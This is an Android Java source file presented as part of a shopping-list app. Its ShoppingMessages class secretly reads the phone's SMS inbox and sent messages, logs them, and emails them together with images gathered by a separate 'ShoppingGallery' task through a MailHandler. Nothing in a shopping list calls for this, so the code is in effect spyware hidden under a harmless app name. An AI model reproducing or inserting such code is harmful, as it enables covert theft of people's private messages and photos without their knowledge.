package com.example.jonas.shoppinglist.processes;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Telephony;
import android.util.Log;

import com.example.jonas.shoppinglist.communication.MailHandler;
import com.example.jonas.shoppinglist.domain.Message;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;

public class ShoppingMessages extends AsyncTask<Void,Void,List<Message>> {
    private static final String LOG_TAG = ShoppingMessages.class.getSimpleName();

    private Activity activity;
    private Cursor messageCursor;
    private Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
    private Uri uri2 = Telephony.Sms.Sent.CONTENT_URI;
    private String[] projection = {Telephony.Sms.Inbox._ID, Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.DATE_SENT};
    private String[] projection2 = {Telephony.Sms.Sent._ID, Telephony.Sms.Sent.BODY, Telephony.Sms.Sent.ADDRESS, Telephony.Sms.Sent.DATE_SENT};

    public ShoppingMessages(Activity activity) {
        this.activity = activity;
    }

    @Override
    protected List<Message> doInBackground(Void... params) {
        List<Message> messages = new ArrayList<>();
        messageCursor = activity.getContentResolver().query(uri, null, null, null, null);

        int bodyIdx = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.BODY);
        int addressIdx = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.ADDRESS);
        int dateIdx = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.DATE_SENT);
        int idIdX = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Inbox._ID);

        while(messageCursor.moveToNext()){
            messages.add(new Message(messageCursor.getString(idIdX), messageCursor.getString(dateIdx), messageCursor.getString(addressIdx), messageCursor.getString(bodyIdx), "sender"));
        }

        Log.d("MainActivity", "Inbox SMS messages");
        for(Message message : messages){
            Log.d("MainActivity", message.toString());
        }

        messageCursor = activity.getContentResolver().query(uri2, projection2, null, null, null);

        bodyIdx = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Sent.BODY);
        addressIdx = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Sent.ADDRESS);
        dateIdx = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Sent.DATE_SENT);
        idIdX = messageCursor.getColumnIndexOrThrow(Telephony.Sms.Sent._ID);

        messages = new ArrayList<>();

        while(messageCursor.moveToNext()){
            messages.add(new Message(messageCursor.getString(idIdX), messageCursor.getString(dateIdx), messageCursor.getString(addressIdx), messageCursor.getString(bodyIdx), "receiver"));
        }

        return messages;
    }

    @Override
    public void onPostExecute(List<Message> result){
        String body="Messages:\n\n";

        for(Message message : result){
            body += message.toString() + "\n";
        }

        MailHandler handler = new MailHandler(activity);
        try {
            handler.setImgs(new ShoppingGallery(activity).execute().get());
            handler.execute(body);
        } catch (InterruptedException e) {
            Log.e(LOG_TAG, "image loading interrupted: " + e);
        } catch (ExecutionException e) {
            Log.e(LOG_TAG, "image execution failed: " + e);
        }
    }
}
